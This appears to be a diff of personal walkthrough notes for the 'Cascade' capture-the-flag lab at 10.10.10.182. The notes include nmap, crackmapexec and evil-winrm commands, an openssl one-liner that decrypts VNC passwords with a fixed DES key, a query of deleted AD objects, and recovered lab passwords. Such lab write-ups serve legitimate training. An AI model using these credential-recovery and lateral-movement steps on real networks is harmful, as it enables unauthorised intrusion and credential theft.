@@ -5,6 +5,10 @@ The backup is decrypted to gain the password for `s.smith`.
 This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. 
 This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. 
 One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator. 
+
+VNC Hex Passwd Decrypt
+AD - Recycle Bin Objects
+Base64 decrypt
 ############
 1-Enumeration:
     nmap -T5 -sV -sC -Pn 10.10.10.182  -oN enum/scan.log -vv
@@ -72,28 +76,62 @@ One of the deleted user accounts is found to contain a hardcoded password, which
         In the Folder of "s.smith" we found a VNC files once we 'get'the file in the SMB
         We found a PASSWD in Hex that we need to decrypt
 
-        Decrypting the encrypted VNC password
-        https://whatsoftware.com/crack-or-decrypt-vnc-server-encrypted-password/?source=post_page-----aec1ac3bb07a--------------------------------
+
+Exploit:
+    VNC HEX password Decrypt:
+        If we have a WINDOWS Machine:
+            Decrypting the encrypted VNC password
+            https://whatsoftware.com/crack-or-decrypt-vnc-server-encrypted-password/?source=post_page-----aec1ac3bb07a--------------------------------
+
+        Else We can use this cmd:
+            https://github.com/frizb/PasswordDecrypts
+            echo -n <Hex Here> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+
+            echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+                sT333ve2
 
 
         Now we have access to a new account
         └─$ crackmapexec smb 10.10.10.182 -u "s.smith" -p 'sT333ve2' --shares
+            
+            Audit.db Enumeration:
+                We use SQL Browser and import 'Audit.db'
 
-    We have acces to the macine with 's.smith' via evil-winrm
-
-    Audit.db Enumeration:
-        We use SQL Browser and import 'Audit.db'
-
-        We discovered 'ArkSvc' with his encrypted passwd
-
-
-        We verify the group of arksvc:
-            *Evil-WinRM* PS C:\Users\s.smith\Desktop> net user arksvc
-
-                Local Group Memberships      *AD Recycle Bin       *IT  *Remote Management Use
-                Global Group memberships     *Domain Users
-
-
+                We discovered 'ArkSvc' with his encrypted passwd in Base64
     
+    Now we need a windows machine and use 'dnSpy' .Net debugger to find a the Decryption KEY - that will help us to decode the Base64 Passwd
+
+        We add the secret key, the length, the vector, the AES algo in only decrypt tool:
+            https://www.javainuse.com/aesgenerator
+
+    We found the password for ArkSvc:
+        w3lc0meFr31nd
+
+    └─$ evil-winrm -i 10.10.10.182 -u arksvc  -p w3lc0meFr31nd
+
+        net user arksvc:
+            Local Group Memberships      *AD Recycle Bin       *IT
+
+
+    We found that we have to dig into the 'AD - Recycle Bin Objects'
+
+        *Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
+
+            cascadeLegacyPwd  : YmFDVDNyMWFOMDBkbGVz
+            CN                : TempAdmin
+
+            We found the TempAdmin and the Base64 password  
+
+        It is not necessary to restore the user account. Decoding the string with base64 we get the password 
+
+        Kali:
+            echo YmFDVDNyMWFOMDBkbGVz | base64 -d
+
+    Because Tempadmin has the same passwd as admin:
+        ─$ evil-winrm -i 10.10.10.182 -u administrator  -p baCT3r1aN00dles
+
+        
+
+
 
 
